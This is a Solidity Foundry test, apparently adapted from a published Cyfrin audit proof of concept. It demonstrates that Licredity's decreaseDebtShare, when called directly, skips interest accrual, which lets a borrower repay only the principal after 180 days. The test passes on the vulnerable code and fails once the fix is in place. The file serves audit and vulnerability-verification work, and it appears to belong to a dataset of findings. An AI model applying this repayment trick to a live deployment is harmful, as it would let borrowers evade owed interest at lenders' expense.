// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// Proof of Vulnerability for finding 62350 (Cyfrin H-2 / 7.2.2, Licredity v2.0):
// "decreaseDebtShare bypasses interest accrual".
//
// Interest on debt is only brought up to date ("accrued") during the unlock
// flow and a few hook operations. decreaseDebtShare can be called directly on
// the contract, outside that flow, and it does not accrue interest first. So a
// borrower who repays with a direct call pays back exactly what they borrowed,
// skipping the interest that has built up in between.
//
// This test borrows, lets time pass with a raised price (which should grow the
// debt through interest), then repays with a direct decreaseDebtShare call and
// checks that the amount repaid equals the amount borrowed. On the vulnerable
// code no interest is charged, so the two are equal and the test PASSES. The fix
// accrues interest at the start of decreaseDebtShare, so the repaid amount is
// larger and the test FAILS. That difference is what makes this a real oracle.
//
// Source: data_collection/tier1_after_2025-08-31/62350.md (published Cyfrin PoC,
// adapted verbatim). Runs only offline, against local audited code.

import {Deployers} from "./utils/Deployer.sol";
import {Licredity} from "src/Licredity.sol";
import {Fungible} from "src/types/Fungible.sol";
import {ChainInfo} from "src/libraries/ChainInfo.sol";

contract PoV62350_Licredity is Deployers {
    function setUp() public {
        deployETHLicredityWithUniswapV4();
        deployAndSetOracleMock();
        deployLicredityRouter();
    }

    function test_decraseDebtBalance_doesntAccrueInterest() public {
        uint256 positionId = licredityRouter.open();
        licredityRouter.depositFungible{value: 10e8}(positionId, Fungible.wrap(ChainInfo.NATIVE), 10e8);

        uint256 delta = 1e8 * 1e6;

        licredityRouterHelper.addDebt(positionId, delta, address(this));
        uint256 amountBorrowed = licredity.balanceOf(address(this));

        // should cause interest accrual
        oracleMock.setQuotePrice(2 ether);
        vm.warp(block.timestamp + 180 days);

        // decrease debt share call is done directly to licredity
        // avoiding the `unlock` context that accrues interest
        uint256 amountRepaid = licredity.decreaseDebtShare(positionId, delta, false);

        // no interest has been accrued
        assertEq(amountRepaid, amountBorrowed);
    }

    receive() external payable {}
}
